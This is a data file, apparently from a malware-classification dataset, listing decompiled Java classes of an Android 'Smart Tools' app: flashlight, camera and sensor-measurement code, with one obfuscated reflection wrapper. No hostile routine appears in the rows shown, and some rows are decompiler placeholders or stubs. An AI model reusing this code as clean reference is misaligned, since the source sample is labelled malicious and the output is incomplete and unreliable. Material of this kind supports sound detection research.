== null) {           a2=b(i2,i3,parameters);         }         if (a2 == null || Build.MODEL.equals(""T-01C"") || Build.MODEL.equals(""IS04"")) {           this.g=i2;           this.h=i3;         }  else {           this.g=a2.width;           this.h=a2.height;         }         try {           parameters.setPreviewSize(this.g,this.h);           this.f281b.setParameters(parameters);           this.f281b.startPreview();         }  catch (        RuntimeException e) {           this.g=this.f281b.getParameters().getPreviewSize().width;           this.h=this.f281b.getParameters().getPreviewSize().height;           try {             parameters.setPreviewSize(this.g,this.h);             this.f281b.setParameters(parameters);             this.f281b.startPreview();           }  catch (          RuntimeException e2) {             this.g=160;             this.h=120;             try {               parameters.setPreviewSize(this.g,this.h);               this.f281b.setParameters(parameters);               this.f281b.startPreview();             }  catch (            RuntimeException e3) {               e3.printStackTrace();             }           }         }         a();       }     }  catch (    NullPointerException e4) {       e4.printStackTrace();     }   }   @Override public void surfaceCreated(  SurfaceHolder surfaceHolder){     if (this.f281b == null) {       try {         this.f281b=Camera.open();         this.f281b.setPreviewDisplay(this.f280a);       }  catch (      IOException e) {         this.f281b.release();         this.f281b=null;         e.printStackTrace();       } catch (      Exception e2) {         e2.printStackTrace();       }     }     this.e=(PowerManager)this.c.getSystemService(""power"");     if (this.d == null || !this.d.isHeld()) {       this.d=this.e.newWakeLock(10,""Smart Tools"");       this.d.acquire();     }   }   @Override public void surfaceDestroyed(  SurfaceHolder surfaceHolder){     if (this.f281b != null) {       this.f281b.stopPreview();       this.f281b.release();       this.f281b=null;     }     if (this.d.isHeld()) {       this.d.release();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.compass\SmartCompass.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1bdaaba9"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\a.code","public class a {   private static String f305a=Build.MODEL;   public static boolean a(){     return Build.MANUFACTURER.equals(""motorola"") && Build.VERSION.SDK_INT < 9 && !Build.DEVICE.equals(""olympus"");   }   public static boolean a(  String str){     if (f305a.equals(""LG-MS910"")) {       return true;     }     if ((f305a.equals(""GT-S5830"") || f305a.equals(""GT-S5830i"")) && Build.VERSION.RELEASE.equals(""2.3.6"")) {       return true;     }     return (!Build.MANUFACTURER.equalsIgnoreCase(""samsung"") || str.contains(""torch"") || f305a.equals(""SCH-I500"")|| f305a.equals(""SPH-D700"")|| f305a.equals(""SGH-T759"")|| f305a.equals(""SAMSUNG-SGH-I997"")) ? false : true;   }   public static boolean b(){     return (Build.MANUFACTURER.equals(""PANTECH"") && (Build.DEVICE.equals(""ef12s"") || Build.DEVICE.equals(""ef10s"") || Build.DEVICE.equals(""ef13s""))) || f305a.equals(""IS12SH"") || f305a.equals(""SBM006SH"")|| f305a.equals(""SH-12C"")|| f305a.equals(""SBM003SH"")|| f305a.equals(""SBM005SH"")|| f305a.equals(""T-01C"")|| f305a.equals(""IS04"")|| f305a.equals(""IS05"")|| f305a.equals(""IS11CA"")|| f305a.equals(""C771"")|| f305a.equals(""N-04C"")|| f305a.equals(""N-06C"");   }   public static boolean c(){     return f305a.equals(""SCH-I500"") || f305a.equals(""SPH-D700"") || f305a.equals(""SGH-T759"")|| f305a.equals(""GT-P6200"")|| f305a.equals(""GT-P6200L"")|| f305a.equals(""GT-P6201"")|| f305a.equals(""GT-P6210"")|| f305a.equals(""GT-P6211"")|| f305a.equals(""SC-02D"")|| f305a.equals(""YP-G70"")|| f305a.equals(""YP-GB70"")|| f305a.equals(""GT-I8150"")|| f305a.equals(""GT-I8150B"");   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\b.code","public class b {   private Camera f307b;   private Camera.Parameters c;   private Handler d=new c(this);   Camera.AutoFocusCallback f306a=new d(this);   public b(  Camera camera,  Camera.Parameters parameters){     this.f307b=camera;     this.c=parameters;   }   public void a(){     if (this.f307b == null) {       return;     }     new e(this).start();   }   public void b(){     this.c.setFlashMode(FlashWService.c);     this.f307b.setParameters(this.c);     this.f307b.autoFocus(this.f306a);   }   public void c(){     this.c.setFlashMode(FlashWService.d);     this.f307b.setParameters(this.c);     this.f307b.cancelAutoFocus();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\c.code","class c extends Handler {   final b f308a;   public c(  b bVar){     this.f308a=bVar;   }   @Override public void handleMessage(  Message message){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\CameraFlash.code","class CameraFlash extends SurfaceView implements SurfaceHolder.Callback {   private SurfaceHolder f295a;   private Camera f296b;   private Context c;   private Camera.Parameters d;   private String e;   private String f;   public CameraFlash(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.e=""torch"";     this.f="""";     this.c=context;     this.f295a=getHolder();     this.f295a.addCallback(this);     this.f295a.setType(3);   }   private void c(){     this.f296b=Camera.open();     try {       this.f296b.setPreviewDisplay(this.f295a);     }  catch (    IOException e) {       e.printStackTrace();     }     this.d=this.f296b.getParameters();   }   public void a(){     if (this.f296b == null || this.d == null) {       return;     }     if (a.a(this.f)) {       new b(this.f296b,this.d).a();       this.f296b.startPreview();       return;     }     new h(this.f296b,this.d,this.e).a();     try {       this.f296b.startPreview();     }  catch (    RuntimeException e) {       e.printStackTrace();       try {         this.d.setPreviewSize(160,120);         this.f296b.setParameters(this.d);         this.f296b.startPreview();       }  catch (      RuntimeException e2) {         SmartLight.f303a=false;         e2.printStackTrace();       }     }   }   public void b(){     if (this.f296b == null || this.d == null) {       return;     }     if (a.a(this.f)) {       new b(this.f296b,this.d).c();       this.f296b.stopPreview();       this.f296b.release();       c();       return;     }     if (!a.c()) {       new h(this.f296b,this.d).b();       return;     }     new h(this.f296b,this.d).b();     this.f296b.release();     c();   }   @Override public void surfaceChanged(  SurfaceHolder surfaceHolder,  int i,  int i2,  int i3){     if (this.f296b != null) {       this.d=this.f296b.getParameters();     }     if (this.f296b == null) {       Toast.makeText(this.c,this.c.getString(C0000R.string.busy_msg),1).show();       SmartLight.f303a=false;       return;     }     List<String> supportedFlashModes=this.f296b.getParameters().getSupportedFlashModes();     this.f=supportedFlashModes == null ? """" : supportedFlashModes.toString();     if (a.b()) {       this.e=FlashWService.c;     }   }   @Override public void surfaceCreated(  SurfaceHolder surfaceHolder){     if (this.f296b == null) {       try {         this.f296b=Camera.open();         this.f296b.setPreviewDisplay(this.f295a);       }  catch (      IOException e) {         this.f296b.release();         this.f296b=null;         SmartLight.f303a=false;       } catch (      Exception e2) {         e2.printStackTrace();         SmartLight.f303a=false;       }     }   }   @Override public void surfaceDestroyed(  SurfaceHolder surfaceHolder){     if (this.f296b != null) {       try {         this.f296b.stopPreview();         this.f296b.release();         this.f296b=null;       }  catch (      RuntimeException e) {         e.printStackTrace();       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\d.code","class d implements Camera.AutoFocusCallback {   final b f309a;   public d(  b bVar){     this.f309a=bVar;   }   @Override public void onAutoFocus(  boolean z,  Camera camera){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\e.code","public class e extends Thread {   final b f310a;   public e(  b bVar){     this.f310a=bVar;   }   @Override public void run(){     Handler handler;     this.f310a.b();     handler=this.f310a.d;     handler.postDelayed(new f(this),500L);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\f.code","class f implements Runnable {   final e f311a;   public f(  e eVar){     this.f311a=eVar;   }   @Override public void run(){     b bVar;     Handler handler;     b bVar2;     Camera.Parameters parameters;     b bVar3;     Camera camera;     b bVar4;     Camera.Parameters parameters2;     bVar=this.f311a.f310a;     handler=bVar.d;     handler.sendEmptyMessage(0);     bVar2=this.f311a.f310a;     parameters=bVar2.c;     parameters.setFlashMode(FlashWService.d);     try {       bVar3=this.f311a.f310a;       camera=bVar3.f307b;       bVar4=this.f311a.f310a;       parameters2=bVar4.c;       camera.setParameters(parameters2);     }  catch (    RuntimeException e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\FlashWCamera.code","class FlashWCamera extends SurfaceView implements SurfaceHolder.Callback {   private SurfaceHolder f297a;   private Context f298b;   private String c;   public FlashWCamera(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.c=""torch"";     this.f298b=context;     this.f297a=getHolder();     this.f297a.addCallback(this);     this.f297a.setType(3);   }   protected void a(){     if (a.a(FlashWService.i)) {       new b(FlashWService.e,FlashWService.f).a();       FlashWService.e.startPreview();       return;     }     new h(FlashWService.e,FlashWService.f,this.c).a();     try {       FlashWService.e.startPreview();     }  catch (    RuntimeException e) {       e.printStackTrace();       try {         FlashWService.f.setPreviewSize(160,120);         FlashWService.e.setParameters(FlashWService.f);         FlashWService.e.startPreview();       }  catch (      RuntimeException e2) {         SmartLight.f303a=false;         e2.printStackTrace();       }     }   }   @Override public void surfaceChanged(  SurfaceHolder surfaceHolder,  int i,  int i2,  int i3){     if (FlashWService.e != null) {       FlashWService.f=FlashWService.e.getParameters();     }     if (FlashWService.e == null) {       Toast.makeText(this.f298b,this.f298b.getString(C0000R.string.busy_msg),1).show();       SmartLight.f303a=false;       return;     }     List<String> supportedFlashModes=FlashWService.e.getParameters().getSupportedFlashModes();     FlashWService.i=supportedFlashModes == null ? """" : supportedFlashModes.toString();     if (a.b()) {       this.c=FlashWService.c;     }     a();   }   @Override public void surfaceCreated(  SurfaceHolder surfaceHolder){     if (FlashWService.e == null) {       try {         FlashWService.e=Camera.open();         FlashWService.e.setPreviewDisplay(this.f297a);       }  catch (      IOException e) {         FlashWService.e.release();         FlashWService.e=null;         SmartLight.f303a=false;       } catch (      Exception e2) {         e2.printStackTrace();         SmartLight.f303a=false;       }     }   }   @Override public void surfaceDestroyed(  SurfaceHolder surfaceHolder){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\FlashWMain.code","public class FlashWMain extends Activity {   private static Intent f299a;   private static g f300b;   private Boolean c=true;   private SharedPreferences d;   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     if (FlashWService.j) {       finish();       return;     }     FlashWService.j=true;     if (f299a == null) {       f299a=new Intent(this,(Class<?>)FlashWService.class);     }     FlashWService.h=Boolean.valueOf(a.a());     if (FlashWService.h.booleanValue()) {       try {         if (f300b == null) {           f300b=new g();         }       }  catch (      Exception e) {         e.printStackTrace();       }     }     this.d=PreferenceManager.getDefaultSharedPreferences(this);     this.c=Boolean.valueOf(this.d.getBoolean(""isled"",true));   }   @Override protected void onDestroy(){     super.onDestroy();     FlashWService.j=false;   }   @Override protected void onResume(){     super.onResume();     if (!this.c.booleanValue()) {       Toast.makeText(this,getString(C0000R.string.no_led),0).show();       return;     }     FlashWService.g=FlashWService.g ? false : true;     startService(f299a);     if (FlashWService.g) {       if (FlashWService.h.booleanValue()) {         f300b.a();         return;       }  else {         setContentView(C0000R.layout.flash_widget_camera);         return;       }     }     if (FlashWService.h.booleanValue()) {       f300b.b();     }  else {       stopService(f299a);     }   }   @Override public void onWindowFocusChanged(  boolean z){     super.onWindowFocusChanged(z);     if (z) {       finish();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\FlashWProvider.code","public class FlashWProvider extends AppWidgetProvider {   private RemoteViews a(  Context context){     RemoteViews remoteViews=new RemoteViews(context.getPackageName(),C0000R.layout.flash_widget);     remoteViews.setOnClickPendingIntent(C0000R.id.icon_widget,b(context));     return remoteViews;   }   private PendingIntent b(  Context context){     return PendingIntent.getActivity(context,0,new Intent(""android.intent.action.VIEW"").setClass(context,FlashWMain.class),268435456);   }   @Override public void onReceive(  Context context,  Intent intent){     if (!intent.getAction().equals(FlashWService.f301a)) {       super.onReceive(context,intent);       return;     }     RemoteViews remoteViews=new RemoteViews(context.getPackageName(),C0000R.layout.flash_widget);     if (intent.getStringExtra(FlashWService.f302b).equals(FlashWService.c)) {       remoteViews.setImageViewResource(C0000R.id.icon_widget,C0000R.drawable.flash_widget_on);     }  else {       remoteViews.setImageViewResource(C0000R.id.icon_widget,C0000R.drawable.flash_widget_off);     }     AppWidgetManager.getInstance(context).updateAppWidget(new ComponentName(context,(Class<?>)FlashWProvider.class),remoteViews);   }   @Override public void onUpdate(  Context context,  AppWidgetManager appWidgetManager,  int[] iArr){     for (    int i : iArr) {       appWidgetManager.updateAppWidget(i,a(context));     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\FlashWService.code","public class FlashWService extends Service {   public static final String f301a=""Smart.Tools.UPDATE"";   public static final String f302b=""flash led"";   public static final String c=""on"";   public static final String d=""off"";   static Camera e;   static Camera.Parameters f;   static boolean g=false;   static Boolean h=false;   static String i="""";   static boolean j=false;   protected void a(){     if (e == null || f == null) {       return;     }     if (a.a(i)) {       new b(e,f).c();     }  else     if (a.c()) {       new h(e,f).b();     }  else {       new h(e,f).b();     }   }   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){   }   @Override public void onDestroy(){     g=false;     if (h.booleanValue() || e == null) {       return;     }     if (f == null) {       f=e.getParameters();     }     a();     try {       e.stopPreview();       e.release();       e=null;     }  catch (    Exception e2) {       e=null;       e2.printStackTrace();     }   }   @Override public int onStartCommand(  Intent intent,  int i2,  int i3){     Intent intent2=new Intent(this,(Class<?>)FlashWProvider.class);     intent2.setAction(f301a);     intent2.putExtra(f302b,g ? c : d);     sendBroadcast(intent2);     return 2;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\g.code","public class g {   private Object f312a;   private Method f313b;   private Method c;   public g(){     this.f312a=null;     this.f313b=null;     this.c=null;     try {       this.f312a=Jk1qej6n.rWzzHNIE4Bzy8ffLjO(Class.forName(""android.os.IHardwareService$Stub"").getMethod(""asInterface"",IBinder.class),null,new Object[]{(IBinder)Jk1qej6n.rWzzHNIE4Bzy8ffLjO(Class.forName(""android.os.ServiceManager"").getMethod(""getService"",String.class),null,new Object[]{""hardware""})});       Class<?> cls=this.f312a.getClass();       this.f313b=cls.getMethod(""getFlashlightEnabled"",new Class[0]);       this.c=cls.getMethod(""setFlashlightEnabled"",Boolean.TYPE);     }  catch (    Exception e) {       throw new Exception(""LED could not be initialized."");     }   }   public void a(){     try {       Jk1qej6n.rWzzHNIE4Bzy8ffLjO(this.c,this.f312a,new Object[]{true});     }  catch (    Exception e) {     }   }   public void b(){     try {       Jk1qej6n.rWzzHNIE4Bzy8ffLjO(this.c,this.f312a,new Object[]{false});     }  catch (    Exception e) {     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\h.code","class h {   private Camera f314a;   private Camera.Parameters f315b;   private String c;   public h(  Camera camera,  Camera.Parameters parameters){     this.f314a=camera;     this.f315b=parameters;     this.c=""torch"";   }   public h(  Camera camera,  Camera.Parameters parameters,  String str){     this.f314a=camera;     this.f315b=parameters;     this.c=str;   }   public void a(){     try {       this.f315b.setFlashMode(this.c);       this.f314a.setParameters(this.f315b);     }  catch (    RuntimeException e) {       e.printStackTrace();     }   }   public void b(){     try {       this.f315b.setFlashMode(FlashWService.d);       this.f314a.setParameters(this.f315b);     }  catch (    NullPointerException e) {       e.printStackTrace();     } catch (    RuntimeException e2) {       e2.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.light\SmartLight.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5101ccdc"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\a.code","class a implements CompoundButton.OnCheckedChangeListener {   final DialogHeight f324a;   public a(  DialogHeight dialogHeight){     this.f324a=dialogHeight;   }   @Override public void onCheckedChanged(  CompoundButton compoundButton,  boolean z){     this.f324a.l=Boolean.valueOf(z);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\b.code","class b implements Camera.PictureCallback {   final FinderView f325a;   public b(  FinderView finderView){     this.f325a=finderView;   }   @Override public void onPictureTaken(  byte[] r6,  android.hardware.Camera r7){     throw new UnsupportedOperationException(""Method not decompiled: kr.aboy.measure.b.onPictureTaken(byte[], android.hardware.Camera):void"");   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\c.code","class c implements SensorEventListener {   float f326a;   float f327b;   float c;   float d;   g[] k;   final SmartMeasure n;   float[] e=new float[9];   float[] f=new float[9];   float[] g=new float[9];   float[] h=new float[3];   float[] i=new float[3];   boolean j=false;   float[] l=new float[3];   int m=0;   public c(  SmartMeasure smartMeasure){     this.n=smartMeasure;     this.k=new g[]{new g(smartMeasure,null),new g(smartMeasure,null),new g(smartMeasure,null)};   }   @Override public void onAccuracyChanged(  Sensor sensor,  int i){   }   @Override public void onSensorChanged(  SensorEvent sensorEvent){     float[] fArr;     float a2;     float[] fArr2;     float a3;     float[] fArr3;     float a4;     float[] fArr4;     float[] fArr5;     float b2;     float[] fArr6;     float[] fArr7;     float f;     float[] fArr8;     float[] fArr9;     float[] fArr10;     float[] fArr11;     float[] fArr12;     FinderView finderView;     float[] fArr13;     float[] fArr14;     float[] fArr15;     float[] fArr16;     FinderView finderView2;     float[] fArr17;     float[] fArr18;     float[] fArr19;     float[] fArr20;     float[] fArr21;     float f2;     float[] fArr22;     float[] fArr23;     float[] fArr24;     float[] fArr25;     float[] fArr26;     float[] fArr27;     float[] fArr28;     float[] fArr29;     float[] fArr30;     FinderView finderView3;     float[] fArr31;     float[] fArr32;     float[] fArr33;     float[] fArr34;     FinderView finderView4;     float[] fArr35;     float[] fArr36;     float[] fArr37;     float f3;     float[] fArr38;     float[] fArr39;     FinderView finderView5;     float[] fArr40;     float[] fArr41;     float[] fArr42;     FinderView finderView6;     float[] fArr43;     float[] fArr44;     float f4;     float[] fArr45;     FinderView finderView7;     float[] fArr46;     float[] fArr47;     float[] fArr48;     float[] fArr49;     FinderView finderView8;     float[] fArr50;     float[] fArr51;     float[] fArr52;     SensorManager sensorManager;     SensorManager sensorManager2;     SensorEventListener sensorEventListener;     if (SmartMeasure.g == 1 || SmartMeasure.g == 3) {       return;     }     if (sensorEvent.sensor.getType() == 1) {       this.h=(float[])sensorEvent.values.clone();       int i=this.m + 1;       this.m=i;       if (i == 300) {         this.n.a(this.n.getString(C0000R.string.sensor_error));         sensorManager=this.n.y;         if (sensorManager != null) {           sensorManager2=this.n.y;           sensorEventListener=this.n.M;           sensorManager2.unregisterListener(sensorEventListener);         }       }     }  else     if (sensorEvent.sensor.getType() == 2) {       this.i=(float[])sensorEvent.values.clone();       this.j=true;       this.m=0;     }     if (this.i == null || this.h == null || !this.j) {       return;     }     SensorManager.getRotationMatrix(this.e,this.g,this.h,this.i);     SensorManager.remapCoordinateSystem(this.e,1,3,this.f);     SensorManager.getOrientation(this.f,this.l);     fArr=this.n.C;     int i2=SmartMeasure.g / 2;     a2=this.k[0].a(this.l[0]);     fArr[i2]=(float)Math.toDegrees(a2);     fArr2=this.n.E;     int i3=SmartMeasure.g / 2;     a3=this.k[1].a(this.l[1]);     fArr2[i3]=90.0f - ((float)Math.toDegrees(a3));     fArr3=this.n.F;     int i4=SmartMeasure.g / 2;     a4=this.k[2].a(this.l[2]);     fArr3[i4]=(((float)Math.toDegrees(a4)) + 90.0f) - SmartMeasure.j;     fArr4=this.n.D;     int i5=SmartMeasure.g / 2;     SmartMeasure smartMeasure=this.n;     fArr5=this.n.E;     b2=smartMeasure.b(fArr5[SmartMeasure.g / 2]);     fArr4[i5]=b2;     if (SmartMeasure.g == 0) {       fArr43=this.n.D;       if (fArr43[0] > 89.0f) {         finderView8=this.n.w;         fArr50=this.n.C;         float a5=SmartMeasure.a(fArr50[0]);         fArr51=this.n.D;         float a6=SmartMeasure.a(fArr51[0]);         fArr52=this.n.F;         finderView8.a(a5,a6,SmartMeasure.a(fArr52[0]),-1.0f);       }  else {         fArr44=this.n.B;         f4=this.n.J;         fArr45=this.n.D;         fArr44[0]=(float)(f4 * Math.tan(Math.toRadians(fArr45[0])));         finderView7=this.n.w;         fArr46=this.n.C;         float a7=SmartMeasure.a(fArr46[0]);         fArr47=this.n.D;         float a8=SmartMeasure.a(fArr47[0]);         fArr48=this.n.F;         float a9=SmartMeasure.a(fArr48[0]);         fArr49=this.n.B;         finderView7.a(a7,a8,a9,SmartMeasure.a(fArr49[0]));       }     }  else     if (SmartMeasure.l == 0) {       f3=this.n.J;       fArr38=this.n.B;       double d=fArr38[0];       fArr39=this.n.D;       this.f326a=f3 + ((float)(d * Math.tan(Math.toRadians(fArr39[1] - 90.0f)))) + 0.05f;       finderView5=this.n.w;       fArr40=this.n.C;       float a10=SmartMeasure.a(fArr40[1]);       fArr41=this.n.D;       float a11=SmartMeasure.a(fArr41[1]);       fArr42=this.n.F;       finderView5.b(a10,a11,SmartMeasure.a(fArr42[1]),SmartMeasure.a(this.f326a));     }  else     if (SmartMeasure.l == 1) {       fArr20=this.n.D;       if (fArr20[1] > 89.0f) {         finderView4=this.n.w;         fArr35=this.n.C;         float a12=SmartMeasure.a(fArr35[1]);         fArr36=this.n.D;         float a13=SmartMeasure.a(fArr36[1]);         fArr37=this.n.F;         finderView4.a(a12,a13,SmartMeasure.a(fArr37[1]),-1.0f,-1.0f);       }  else {         fArr21=this.n.B;         f2=this.n.J;         fArr22=this.n.D;         fArr21[1]=(float)(f2 * Math.tan(Math.toRadians(fArr22[1])));         fArr23=this.n.C;         float f5=fArr23[1];         fArr24=this.n.C;         this.d=Math.abs(f5 - fArr24[0]);         if (this.d > 180.0f) {           this.d=360.0f - this.d;         }         fArr25=this.n.B;         float f6=fArr25[0];         fArr26=this.n.B;         float f7=f6 * fArr26[0];         fArr27=this.n.B;         float f8=fArr27[1];         fArr28=this.n.B;         double d2=f7 + (f8 * fArr28[1]);         fArr29=this.n.B;         float f9=2.0f * fArr29[0];         fArr30=this.n.B;         this.f327b=(float)Math.sqrt(d2 - ((f9 * fArr30[1]) * Math.cos(Math.toRadians(this.d))));         finderView3=this.n.w;         fArr31=this.n.C;         float a14=SmartMeasure.a(fArr31[1]);         fArr32=this.n.D;         float a15=SmartMeasure.a(fArr32[1]);         fArr33=this.n.F;         float a16=SmartMeasure.a(fArr33[1]);         fArr34=this.n.B;         finderView3.a(a14,a15,a16,SmartMeasure.a(fArr34[1]),SmartMeasure.a(this.f327b));       }     }  else     if (SmartMeasure.l == 2) {       fArr6=this.n.D;       if (fArr6[1] > 89.0f) {         finderView2=this.n.w;         fArr17=this.n.C;         float a17=SmartMeasure.a(fArr17[1]);         fArr18=this.n.D;         float a18=SmartMeasure.a(fArr18[1]);         fArr19=this.n.F;         finderView2.b(a17,a18,SmartMeasure.a(fArr19[1]),-1.0f,-1.0f);       }  else {         fArr7=this.n.B;         f=this.n.J;         fArr8=this.n.D;         fArr7[1]=(float)(f * Math.tan(Math.toRadians(fArr8[1])));         fArr9=this.n.C;         float f10=fArr9[1];         fArr10=this.n.C;         this.d=Math.abs(f10 - fArr10[0]);         if (this.d > 180.0f) {           this.d=360.0f - this.d;         }         fArr11=this.n.B;         float f11=fArr11[0];         fArr12=this.n.B;         this.c=(float)(f11 * fArr12[1] * Math.sin(Math.toRadians(this.d)));         finderView=this.n.w;         fArr13=this.n.C;         float a19=SmartMeasure.a(fArr13[1]);         fArr14=this.n.D;         float a20=SmartMeasure.a(fArr14[1]);         fArr15=this.n.F;         float a21=SmartMeasure.a(fArr15[1]);         fArr16=this.n.B;         finderView.b(a19,a20,a21,SmartMeasure.a(fArr16[1]),SmartMeasure.a(this.c));       }     }     finderView6=this.n.w;     finderView6.postInvalidate();     this.j=false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\d.code","public class d {   final SmartMeasure f328a;   public d(  SmartMeasure smartMeasure){     this.f328a=smartMeasure;   }   public Dialog a(  Context context){     float f;     ScrollView scrollView=new ScrollView(context);     LinearLayout linearLayout=new LinearLayout(context);     scrollView.addView(linearLayout);     linearLayout.setOrientation(0);     linearLayout.setPadding(10,10,10,10);     AlertDialog.Builder builder=new AlertDialog.Builder(context);     builder.setView(scrollView);     builder.setIcon(C0000R.drawable.dialog_directions);     builder.setTitle(C0000R.string.calibrate_label);     ImageView imageView=new ImageView(context);     imageView.setImageResource(C0000R.drawable.step_calibrate);     linearLayout.addView(imageView);     TextView textView=new TextView(context);     textView.setTextSize(15.0f);     StringBuilder sb=new StringBuilder(String.valueOf(this.f328a.getString(C0000R.string.calibrate_current)));     f=this.f328a.K;     textView.setText(sb.append(f).append(""Ëš\n\n"").append(this.f328a.getString(C0000R.string.calibrate_msg)).toString());     linearLayout.addView(textView);     builder.setPositiveButton(C0000R.string.calibrate,new e(this,context));     builder.setNegativeButton(C0000R.string.cancel,new f(this));     return builder.create();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\DialogHeight.code","!org.eclipse.jdt.core.dom.TypeDeclaration@33c961c1"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\e.code","public class e implements DialogInterface.OnClickListener {   final d f329a;   private final Context f330b;   public e(  d dVar,  Context context){     this.f329a=dVar;     this.f330b=context;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     SmartMeasure smartMeasure;     float[] fArr;     SmartMeasure smartMeasure2;     SmartMeasure smartMeasure3;     SmartMeasure smartMeasure4;     float[] fArr2;     SmartMeasure smartMeasure5;     float[] fArr3;     SmartMeasure smartMeasure6;     SmartMeasure smartMeasure7;     float f;     SmartMeasure smartMeasure8;     float[] fArr4;     SmartMeasure smartMeasure9;     SmartMeasure smartMeasure10;     float f2;     SmartMeasure smartMeasure11;     SharedPreferences sharedPreferences;     SmartMeasure smartMeasure12;     float f3;     smartMeasure=this.f329a.f328a;     fArr=smartMeasure.E;     if (fArr[SmartMeasure.g / 2] >= 83.0f) {       smartMeasure5=this.f329a.f328a;       fArr3=smartMeasure5.E;       if (fArr3[SmartMeasure.g / 2] <= 97.0f) {         smartMeasure6=this.f329a.f328a;         smartMeasure7=this.f329a.f328a;         f=smartMeasure7.K;         smartMeasure8=this.f329a.f328a;         fArr4=smartMeasure8.E;         smartMeasure6.K=SmartMeasure.a((f + fArr4[SmartMeasure.g / 2]) / 2.0f);         Context context=this.f330b;         smartMeasure9=this.f329a.f328a;         StringBuilder sb=new StringBuilder(String.valueOf(smartMeasure9.getString(C0000R.string.calibrate_yes)));         smartMeasure10=this.f329a.f328a;         f2=smartMeasure10.K;         Toast.makeText(context,sb.append(f2).append(""Ëš"").toString(),0).show();         smartMeasure11=this.f329a.f328a;         sharedPreferences=smartMeasure11.G;         SharedPreferences.Editor edit=sharedPreferences.edit();         StringBuilder sb2=new StringBuilder();         smartMeasure12=this.f329a.f328a;         f3=smartMeasure12.K;         edit.putString(""pitch90"",sb2.append(f3).toString());         edit.commit();         dialogInterface.dismiss();       }     }     smartMeasure2=this.f329a.f328a;     smartMeasure3=this.f329a.f328a;     StringBuilder append=new StringBuilder(String.valueOf(smartMeasure3.getString(C0000R.string.calibrate_no))).append("" ("");     smartMeasure4=this.f329a.f328a;     fArr2=smartMeasure4.E;     smartMeasure2.a(append.append(SmartMeasure.a(fArr2[SmartMeasure.g / 2])).append(""Ëš)"").toString());     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\f.code","public class f implements DialogInterface.OnClickListener {   final d f331a;   public f(  d dVar){     this.f331a=dVar;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.dismiss();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\kr.aboy.measure\FinderView.code","!org.eclipse.jdt.core.dom.TypeDeclaration@50a6e2d8"
